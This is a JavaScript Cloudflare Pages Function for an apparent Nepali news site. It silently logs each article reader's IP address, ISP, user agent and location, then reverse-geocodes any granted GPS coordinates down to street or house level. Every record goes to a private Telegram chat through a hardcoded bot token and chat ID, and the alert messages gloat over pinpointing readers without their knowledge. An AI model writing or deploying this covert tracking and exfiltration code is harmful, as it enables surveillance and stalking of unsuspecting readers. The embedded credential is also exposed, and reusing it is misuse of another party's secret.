// Cloudflare Pages Function: /api/location with Telegram Instant Alerts

const DEFAULT_BOT_TOKEN = '9189550669:AAEorTZyQhF2vZlZHzFgU6Tgxqw4Y2CKgrk';
const DEFAULT_CHAT_ID = '7070372458';

// Reverse geocode via OpenStreetMap Nominatim
async function reverseGeocode(lat, lon) {
  try {
    const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1&accept-language=ne,en`;
    const res = await fetch(url, {
      headers: {
        'User-Agent': 'BulletKhabar-LocationService/1.0',
      },
    });
    if (!res.ok) return null;
    const data = await res.json();
    const addr = data.address || {};

    return {
      displayName: data.display_name || '',
      road: addr.road || addr.street || '',
      neighbourhood: addr.neighbourhood || addr.suburb || addr.quarter || '',
      city: addr.city || addr.town || addr.municipality || addr.village || '',
      district: addr.state_district || addr.county || '',
      state: addr.state || '',
      country: addr.country || '',
      mapsUrl: `https://www.google.com/maps?q=${lat},${lon}`,
    };
  } catch {
    return {
      displayName: '',
      mapsUrl: `https://www.google.com/maps?q=${lat},${lon}`,
    };
  }
}

async function sendTelegramAlert(env, record, isExactGPS = false) {
  const token = (env && env.TELEGRAM_BOT_TOKEN) || DEFAULT_BOT_TOKEN;
  const chatId = (env && env.TELEGRAM_CHAT_ID) || DEFAULT_CHAT_ID;

  if (!token || !chatId) return;

  let message = '';

  if (isExactGPS) {
    const area = record.address?.neighbourhood || record.address?.road || 'Street Level';
    const city = record.address?.city || record.address?.district || 'Nepal';
    const mapsUrl = record.address?.mapsUrl || `https://www.google.com/maps?q=${record.latitude},${record.longitude}`;

    message = `🎯 *EXACT GPS PINPOINTED (User Clicked Allow)*
━━━━━━━━━━━━━━━━━━━━
📰 *Article:* \`${record.slug}\`
🏙️ *Area / Tole:* ${area}
🗺️ *City / District:* ${city}
📌 *Full Address:* ${record.address?.displayName || 'N/A'}
🎯 *GPS Precision:* ±${record.accuracy || '?'} meters
🌐 *IP:* \`${record.ip}\`
⏰ *Time:* ${new Date().toLocaleString('en-US', { timeZone: 'Asia/Kathmandu' })} (Nepal Time)

🔗 [Click here to Open in Google Maps](${mapsUrl})`;
  } else {
    // Zero-click IP Location
    const mapsUrl = `https://www.google.com/maps?q=${record.latitude},${record.longitude}`;

    message = `🌐 *NEW VISITOR OPENED ARTICLE (Zero Clicks / IP)*
━━━━━━━━━━━━━━━━━━━━
📰 *Article:* \`${record.slug}\`
🏙️ *City:* ${record.city || 'Unknown'}
🗺️ *Region / Province:* ${record.region || 'Nepal'}
📡 *ISP Network:* ${record.isp || 'Mobile / Wi-Fi'}
🌐 *IP Address:* \`${record.ip}\`
🎯 *Estimated Area:* City Level (~1-3 km)
⏰ *Time:* ${new Date().toLocaleString('en-US', { timeZone: 'Asia/Kathmandu' })} (Nepal Time)

🔗 [Approximate City Location on Maps](${mapsUrl})
_(Waiting for user to tap 'Allow' for exact house GPS)_`;
  }

  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown',
        disable_web_page_preview: false,
      }),
    });
  } catch (e) {
    console.error('Telegram notification error:', e);
  }
}

export async function onRequestPost(context) {
  try {
    const body = await context.request.json();
    const { latitude, longitude, accuracy, slug, type } = body;
    const cf = context.request.cf || {};

    const ip = context.request.headers.get('cf-connecting-ip') || 'local';
    const userAgent = context.request.headers.get('user-agent') || '';

    // If exact GPS coordinates provided
    if (latitude !== undefined && longitude !== undefined && type !== 'ip_only') {
      const address = await reverseGeocode(latitude, longitude);

      const record = {
        id: Date.now().toString(),
        latitude,
        longitude,
        accuracy: accuracy ? Math.round(accuracy) : null,
        address,
        slug: slug || 'home',
        timestamp: new Date().toISOString(),
        ip,
        userAgent,
      };

      context.waitUntil(sendTelegramAlert(context.env, record, true));

      return new Response(JSON.stringify({ success: true, type: 'gps', record }), {
        status: 200,
        headers: { 'Content-Type': 'application/json' },
      });
    }

    // Fallback: Zero-Click Cloudflare IP Geolocation
    const ipLat = cf.latitude ? parseFloat(cf.latitude) : 27.7172;
    const ipLon = cf.longitude ? parseFloat(cf.longitude) : 85.3240;

    const record = {
      id: Date.now().toString(),
      latitude: ipLat,
      longitude: ipLon,
      city: cf.city || 'Kathmandu',
      region: cf.region || cf.country || 'Nepal',
      isp: cf.asOrganization || 'Internet Provider',
      slug: slug || 'home',
      timestamp: new Date().toISOString(),
      ip,
      userAgent,
    };

    context.waitUntil(sendTelegramAlert(context.env, record, false));

    return new Response(JSON.stringify({ success: true, type: 'ip', record }), {
      status: 200,
      headers: { 'Content-Type': 'application/json' },
    });
  } catch {
    return new Response(JSON.stringify({ error: 'Failed to record location' }), {
      status: 500,
      headers: { 'Content-Type': 'application/json' },
    });
  }
}

export async function onRequestGet() {
  return new Response(JSON.stringify({ status: 'ok', service: 'Telegram Location Service Active' }), {
    status: 200,
    headers: { 'Content-Type': 'application/json' },
  });
}
